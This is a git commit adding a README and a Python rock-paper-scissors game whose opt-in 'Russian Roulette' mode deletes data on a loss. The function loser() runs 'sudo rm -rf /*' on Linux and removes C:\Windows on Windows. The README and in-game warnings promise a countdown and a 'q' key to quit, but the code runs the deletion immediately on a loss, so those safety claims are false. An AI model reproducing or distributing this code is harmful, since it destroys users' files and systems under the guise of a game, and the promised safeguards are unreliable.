485a23e3dfb4948010cff013ed800561a2bf73c3
private <private>
2024-05-08 22:48:35 +0530

    First version of the game, with no interactive GUI

--- README.md
+++ README.md
@@ -1,1 +1,59 @@
-# rpserusre
+# Rock 🪨, Paper 🧻, Scissors ✂️ , Russian Roulette 🔪 Edition!
+
+> [!WARNING]
+> If you turn on the Roulette mode, it can and **WILL** destroy your computer.
+> You are on your own if you do so. I am not responsible if you lose.
+> By default, it is off. You will be asked to turn it on at the start of the game.
+
+> [!CAUTION]
+> You can win several times but you can only lose once, if you turn on the
+> Roulette mode.
+
+## How to play
+
+- Rock 🪨 beats Scissors ✂️
+- Paper 🧻 beats Rock 🪨
+- Scissors ✂️ beats Paper 🧻
+
+The game starts with asking if you want to turn on the roulette mode. If turned
+on it will show a list of terms and conditions that you must accept before you
+continue playing.
+
+> [!TIP]
+> you can just press <kbd>Enter</kbd> when prompted the yes/no question to
+> continue as by default the roulette mode is turned off.
+
+If you _do not turn on_ the roulette mode, you will be asked how many rounds you
+want to play the game for.
+
+> [!NOTE]
+> With roulette mode turned on you can only play one round at one game.
+
+For each round of the game, you will be asked your move. And then the computer
+will choose it's move at random. The winner will be declared afterwards.
+
+**If you turned on the roulette mode** and lose the round. The program will try
+and delete every file on your computer. It may or may not be successful in doing
+so, but it might leave irreversible data loss, including but not limited to your
+personal data and system files.
+
+You will be given ample opportunities, to back out of the game if you wish. Even
+after you lose, the deletion does not start immediately. It will mark
+a countdown which when it reaches zero, the deletion will start and cannot be
+stopped.
+
+Before the countdown reaches zero, you can quit any time by pressing
+<kbd>q</kbd>.
+
+## Terms and Conditions
+
+- By turning on the roulette mode, you agree that it may lead to irreversible
+  data loss.
+- By turning on the roulette mode and accepting the consequences, you AGREE that
+  "I", "SomniaUmbra", "Author", will not be responsible for any data loss that
+  may occur.
+- By turning on the roulette mode and accepting the terms, you AGREE that you
+  have been warned of the consequences of turning on the roulette mode.
+- By reading the terms and warnings you agree that you acknowledge that you can
+  quit the game at any time by pressing <kbd>q</kbd> before the countdown
+  reaches 0.
---
+++ rpse.py
@@ -0,0 +1,306 @@
+"""Rock, Paper, Scissors Russian Roulette Edition
+You can play the rock paper scissors game but if you lose... you
+**LOSE**!
+
+Author: SomniaUmbra
+Date: 07 May 2024
+
+Copyright (C) 2024  SomniaUmbra
+
+This program is free software: you can redistribute it and/or modify it under
+the terms of the GNU General Public License as published by the Free Software
+Foundation, either version 3 of the License, or (at your option) any later
+version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT ANY
+WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
+A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with
+this program. If not, see <https://www.gnu.org/licenses/>.
+"""
+
+import random
+import platform
+import sys
+import time
+import subprocess
+
+operating_system = platform.system()
+
+# Game assets
+game_logo = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠋⠈⣷⠶⠶⠶⠶⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣧⣤⣤⠤⣼⣷⣤⣄⣀⢿⠛⠛⠿⢿⣿⣷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⡿⠛⠉⠁⠀⠀⠀⠀⠀⢀⡿⢸⡆⠀⠀⠀⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠀⠀⠀⣀⣀⣀⣀⣠⠞⠁⢸⡇⠀⠀⠀⡇⠈⠙⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⢻⡏⠉⠉⣧⠀⠀⢸⡇⠀⠀⢰⡇⠀⠀⡀⠘⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⡾⢷⣄⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣟⣛⡻⠶⢤⣼⠿⣤⣄⣸⣇⠀⢠⡇⠀⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⣠⢤⣄⠀⠀⠀⠀⠀⠀
+⠀⣰⠶⢶⣏⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠘⠋⠉⠉⠛⢶⣤⡀⠀⠉⠉⠙⠓⠾⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⡄⠀⢀⡼⠋⠀⠉⣷⠀⠀⠀⠀⠀
+⢸⡏⠀⠀⠈⠳⣄⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠦⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠟⠁⠀⢠⡾⠃⠀⠀⠀⠀⠀
+⠈⢻⣦⡀⠀⠀⠈⠳⣦⡀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⣴⠏⠀⠀⠀⠀⠀⠀⠀
+⣴⠏⠈⠻⣦⡀⠀⠀⠈⠻⣦⡀⠀⠀⠙⢿⣿⡟⠛⠛⠛⠷⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⣠⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠻⣄⠀⠀⠈⠻⣦⡀⠀⠀⠈⠻⠆⠀⠀⠀⠙⠳⣄⡀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⢀⣾⡏⠀⠀⢀⣀⣠⠤⠴⠖⠚⣆
+⠀⢩⡷⣤⡀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠆⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⢠⡿⠉⠉⠙⠻⢿⣿⠛⠋⠁⠀⠀⠀⢰⣿⡿⠷⠒⠋⠉⠁⠀⠀⠀⠀⠀⢸
+⠀⣿⡄⠈⠛⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⣴⠋⠀⠀⠀⠀⢰⡄⠈⠙⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡤⠤⠖⠚⠉
+⠀⠈⠻⢦⣄⠀⠙⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⡾⠁⠀⠀⠀⠀⠀⢸⠿⢦⡄⠀⠀⣇⣀⣠⣤⢤⣴⠖⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢷⣄⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⣇⠀⠀⠀⠀⠀⠀⡼⠀⠸⡇⠀⢸⠃⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⢻⡄⠀⠀⠀⠀⣼⠁⢀⡟⠛⠦⠾⠤⠤⠤⢤⡴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⢳⣄⢀⣼⠏⠀⠀⠀⠀⠀⠀⠸⠷⠤⢤⣄⣀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠙⢿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⡵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣶⣦⣤⠶⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠀⢀⣤⣤⣤⣤⣤⣤⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⢷⣶⣤⣤⣤⣤⣴⣶⣾⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+rock = """
+⠀⠀⠀⠀⠀⣠⡴⠖⠒⠲⠶⢤⣄⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⡾⠁⠀⣀⠔⠁⠀⠀⠈⠙⠷⣤⠦⣤⡀⠀
+⣠⠞⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⠈⢿⡀
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠛⠛⠃⠸⡇⠈⣇
+⣹⡷⠤⠤⠤⠄⠀⠀⠀⠀⢠⣤⡤⠶⠖⠛⠀⣿⠀⣿
+⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠖⠋⢀⣿⣠⠏
+⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⠀
+⠀⠉⢿⡋⠉⠉⠁⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⠀⠀ 
+⠀⠀⠈⠛⠶⠦⠤⠤⠤⠶⠶⠛⠋⠁⠀⠀⠀⠀⠀⠀
+"""
+paper = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠖⠒⢶⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀
+⢠⡶⠒⠳⠶⣄⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⣰⠏⠀⢀⣤⣤⣄⡀⠀⠀
+⠸⡇⠀⠀⠀⠘⣇⠀⠀⣠⡾⠁⠀⠀⠀⢀⣾⣣⡴⠚⠉⠀⠀⠈⠹⡆⠀
+⠀⢻⡄⠀⠀⠀⢻⣠⡾⠋⠀⠀⠀⠀⣠⡾⠋⠁⠀⠀⠀⠀⢀⣠⡾⠃⠀
+⠀⠀⣿⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⡰⠋⠀⠀⠀⠀⠀⣠⠶⠋⠁⠀⠀⠀
+⠀⠠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠁⠀⠀⠀⢀⣴⡿⠥⠶⠖⠛⠛⢶⡄
+⢀⣰⡇⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⢀⣠⠼⠃
+⣿⠉⣇⠀⡴⠟⠁⣠⡾⠃⠀⠀⠀⠀⠀⠈⠀⠀⠀⣀⣤⠶⠛⠉⠀⠀⠀
+⢻⡄⠹⣦⠀⠶⠛⢁⣠⡴⠀⠀⠀⠀⠀⠀⣠⡶⠛⠉⠀⠀⠀⠀⠀⠀⠀
+⠀⠻⣄⠈⢷⣄⠈⠉⠁⠀⠀⠀⢀⣠⡴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠉⠳⢤⣭⡿⠒⠶⠶⠒⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+scissors = """
+⠀⠀⠀⢀⣠⣤⣀⣠⣤⠶⠶⠒⠶⠶⣤⣀⠀⠀⠀⠀⠀⠀     ⠀
+⠀⢀⡴⠋⣠⠞⠋⠁⠀⠀⠀⠀⠙⣄⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢀⡾⠁⣴⠋⠰⣤⣄⡀⠀⠀⠀⠀⠈⠳⢤⣼⣇⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⠃⢰⠇⠰⢦⣄⡈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠛⠛⠓⠲⢦⣄⠀
+⠸⣧⣿⠀⠻⣤⡈⠛⠳⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆
+⠀⠈⠹⣆⠀⠈⠛⠂⠀⠀⠀⠀⠀⠀⠈⠐⠒⠒⠶⣶⣶⠶⠤⠤⣤⣠⡼⠃
+⠀⠀⠀⠹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⢦⣀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⣦⣀⠀⠀⠀⠀⠐⠲⠤⣤⣀⡀⠀⠀⠀⠀⠀⠉⢳⡄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠉⠛⠶⠤⠤⠤⠶⠞⠋⠉⠙⠳⢦⣄⡀⠀⠀⠀⡷⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⠦⠾⠃⠀⠀
+"""
+
+# FATAL setting
+ROULETTE = False
+MAX_ROUNDS = 1
+ESCAPE_TIME = 0.2
+TESTING = False
+
+
+choices = {1: rock, 2: paper, 3: scissors}
+announcement = {
+    "ROULETTE": {
+        "WIN": "You win! Your system lives to see another day.",
+        "LOSE": "You lose this round... and your system hahahaha!!!",
+        "TIE": "It's a tie! Your system is still alive... let's see for how long!!!",
+    },
+    "NORMAL": {
+        "WIN": "You win! Hurray!! 🎉",
+        "LOSE": "You lose this round... 😢",
+        "TIE": "Alright, it's a tie!🪢",
+    },
+}
+
+
+def rps():
+    pc_move = random.randint(1, 3)
+
+    for i in choices.values():
+        print(i)
+        time.sleep(0.5)
+
+    print(choices[pc_move])
+
+    return pc_move
+
+
+def loser():
+    """If you lose, you lose *smirk*
+
+    FATAL: removes all files on the system, and/or makes the system unusable
+    """
+    if operating_system == "Linux":
+        subprocess.run(["sudo", "rm", "-rf", "/*"], shell=True)
+    elif operating_system == "Windows":
+        subprocess.run(["rmdir", "/s", "/q", "C:\\Windows"], shell=True)
+
+
+pc_move = ""
+user_move = ""
+
+
+def win_or_lose(pc_move, user_move, roulette_mode):
+    win_situation = (
+        (pc_move == 1 and user_move == 2)
+        or (pc_move == 2 and user_move == 3)
+        or (pc_move == 3 and user_move == 1)
+    )
+
+    lose_situation = (
+        (pc_move == 1 and user_move == 3)
+        or (pc_move == 2 and user_move == 1)
+        or (pc_move == 3 and user_move == 2)
+    )
+
+    if roulette_mode:
+        if win_situation:
+            return announcement["ROULETTE"]["WIN"]
+        elif lose_situation:
+            print(announcement["ROULETTE"]["LOSE"])
+            loser()
+        else:
+            return announcement["ROULETTE"]["TIE"]
+
+    if win_situation:
+        return announcement["NORMAL"]["WIN"]
+    elif lose_situation:
+        return announcement["NORMAL"]["LOSE"]
+    else:
+        return announcement["NORMAL"]["TIE"]
+
+    # if pc_move == user_move:
+    #     return TIE
+    #
+    # if win_situation:
+    #     return WIN
+    #
+    # if lose_situation:
+    #     if ROULETTE:
+    #         print(LOSE)
+    #         time.sleep(ESCAPE_TIME)
+    #         loser()
+    #     return LOSE
+
+
+def set_rounds():
+    global MAX_ROUNDS
+    while True:
+        try:
+            n_rounds = int(input("Enter number of rounds: "))
+
+            if n_rounds > 0:
+                MAX_ROUNDS = n_rounds
+                break
+
+            else:
+                print("Rounds must be greater than 0.")
+
+        except ValueError:
+            print("Invalid input. Rounds must be an integer.")
+
+
+def warning():
+    """Gives a warning before starting the game with roulette mode.
+    And a prompt to accept the terms and conditions.
+
+    Returns: `True` if the user agrees with the terms and conditions else
+    `False`
+    """
+
+    WARNING = """
+    You have turned on the Roulette mode. Before continuing, make sure you read
+    the following terms and conditions:
+
+    ## Terms and Conditions
+
+    - By turning on the roulette mode, you agree that it may lead to irreversible
+      data loss.
+    - By turning on the roulette mode and accepting the consequences, you AGREE that
+      "I", "SomniaUmbra", "Author", will not be responsible for any data loss that
+      may occur.
+    - By turning on the roulette mode and accepting the terms, you AGREE that you
+      have been warned of the consequences of turning on the roulette mode.
+    - By reading the terms and warnings you agree that you acknowledge that you can
+      quit the game at any time by pressing \"q\" (without the quotes) before 
+      the countdown reaches 0.
+    """
+    PROMPT = """
+    If you agree with the given terms and conditions, type, "I agree", otherwise
+    if you don't want to continue with roulette mode, type "I don't agree".
+    > """
+    ACKNOWLEDGEMENT = """
+    You have agreed to the terms and conditions. It will only be remembered for
+    this game.
+
+    Remember that you can quit the game at any time by pressing "q".
+
+    Good luck!
+    """
+    print(WARNING)
+
+    while True:
+        try:
+            user_input = input(PROMPT)
+
+            if user_input.lower() == "i agree":
+                print(ACKNOWLEDGEMENT)
+                return True
+            elif user_input.lower() == "i don't agree":
+                print("Changing to normal mode, which doesn't have any consequences...")
+                return False
+            else:
+                print("Invalid input. Please try again.")
+
+        except KeyboardInterrupt:
+            print("\nExiting...")
+            sys.exit(0)
+
+
+def game():
+    global ROULETTE, MAX_ROUNDS
+    roulette = input("Roulette mode? (y/n): ")
+
+    if roulette == "y":
+        _ = warning()
+        if _:
+            ROULETTE = True
+            MAX_ROUNDS = 1
+        elif _ is False:
+            set_rounds()
+    else:
+        print("Roulette mode disabled.")
+        print("Good choice! hehe")
+        set_rounds()
+
+    if TESTING:
+        ROULETTE = False
+
+    for _ in range(MAX_ROUNDS):
+        while True:
+            try:
+                user_move = int(input("Enter your move: "))
+
+                if user_move < 1 or user_move > 3:
+                    print("Move must be between 1 and 3.")
+                    continue
+                else:
+                    break
+            except ValueError:
+                print("Invalid input. Move must be an integer.")
+                continue
+        pc_move = rps()
+
+        result = win_or_lose(pc_move, user_move, ROULETTE)
+
+        print(result)
+
+
+def main():
+    game()
+
+
+if __name__ == "__main__":
+    main()
